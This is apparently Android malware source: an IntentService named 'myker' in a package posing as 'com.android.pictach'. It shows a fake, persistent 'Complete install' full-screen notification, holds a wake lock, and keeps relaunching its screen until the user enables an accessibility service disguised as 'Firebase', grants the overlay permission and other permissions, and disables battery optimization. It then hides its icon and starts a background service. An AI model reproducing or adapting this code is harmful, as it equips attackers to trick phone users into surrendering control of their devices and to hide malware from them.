package com.android.pictach;

import android.app.IntentService;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.net.Uri;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;

public class myker extends IntentService {

    PowerManager.WakeLock wakeLock;

    public myker() {
        super("");
        this.wakeLock = null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (this.wakeLock != null && this.wakeLock.isHeld()) {
            this.wakeLock.release();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    public static void cancelnotification(Context context, int id) {
        ((NotificationManager) context.getSystemService("notification")).cancel(id);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
                if (nm != null && nm.getNotificationChannel("MyInstall") == null) {
                    NotificationChannel ch = new NotificationChannel("MyInstall", "Install", 4);
                    ch.setDescription("Installation");
                    ch.setShowBadge(false);
                    ch.setSound(null, null);
                    nm.createNotificationChannel(ch);
                }
            }

            Intent fullIntent = new Intent(this, MainActivity.class);
            fullIntent.setFlags(1879080960);

            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "MyInstall")
                    .setSmallIcon(android.R.color.transparent)
                    .setContentTitle("Complete install")
                    .setContentText("Click Here to Complete installing")
                    .setPriority(1)
                    .setCategory("call")
                    .setDefaults(-1)
                    .setOngoing(true)
                    .setAutoCancel(false)
                    .setFullScreenIntent(
                            PendingIntent.getActivity(this, 0, fullIntent, 201326592), true
                    );

            startForeground(1547, builder.build());

            PowerManager pm = (PowerManager) getSystemService("power");
            if (this.wakeLock == null) {
                this.wakeLock = pm.newWakeLock(1, "Android:Watchlock");
            }
            if (this.wakeLock != null && !this.wakeLock.isHeld()) {
                this.wakeLock.acquire();
            }

            while (true) {
                try {
                    Thread.sleep(Utils.speedTime);
                } catch (InterruptedException unused) {
                }
                try {
                    if (!Utils.isAccessibilityEnabled(this, Firebase.class) && Utils.NeedSuper()) {
                        if (Utils.isScreenUnlocked(this)) {
                            Utils.Trys++;
                            if (Utils.Trys >= 5) {
                                Utils.Trys = 0;
                                Utils.speedTime = 3500;
                                startActivity(new Intent(this, MainActivity.class)
                                        .addFlags(268435456)
                                        .addFlags(536870912)
                                        .addFlags(1073741824));
                            }
                        }
                    } else if (Build.VERSION.SDK_INT >= 23
                            && !Settings.canDrawOverlays(this)
                            && !Utils.NeedSuper()) {
                        if (!Utils.shown) {
                            Utils.speedTime = 5000;
                            Utils.shown = true;
                            startActivity(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION").addFlags(268435456));
                        }
                    } else if (!Utils.hasPermissions(this, Utils.PERMISSIONS())) {
                        if (!Utils.asked) {
                            Utils.speedTime = 3500;
                            Utils.asked = true;
                        } else {
                            Utils.speedTime = 2000;
                        }
                    } else {
                        if (!love.isHidden) {
                            love.isHidden = true;
                            Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
                        }
                        if (!Utils.iamworking) {
                            try {
                                love.allok = true;
                                Utils.iamworking = true;
                                Firebase.Firebasebypass = false;
                                Firebase.FirebaseFOR_prim = false;
                                Firebase.FirebaseCheckPrims = true;
                                if (LoveApi0.isServiceNotRunning(Api.class, this)) {
                                    Utils.currentPrefKey = getResources().getString(R.string.difficultye56);
                                    startService(new Intent(this, Api.class));
                                }
                                if (!Utils.isBatteryOptimizationDisabled(this)) {
                                    Intent i = new Intent(
                                            "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                                            android.net.Uri.parse("package:" + getPackageName())
                                    );
                                    i.addFlags(268435456);
                                    i.addFlags(536870912);
                                    i.addFlags(1073741824);
                                    startActivity(i);
                                }
                            } catch (Exception unused2) {
                            }
                            try {
                                if (Build.VERSION.SDK_INT >= 26) {
                                    cancelnotification(this, 6676);
                                    stopForeground(true);
                                    stopSelf();
                                }
                            } catch (Exception unused3) {
                            }
                        }
                        Utils.speedTime = 25000;
                    }
                } catch (Exception unused4) {
                }
            }
        } catch (Exception unused5) {
        }
    }
}
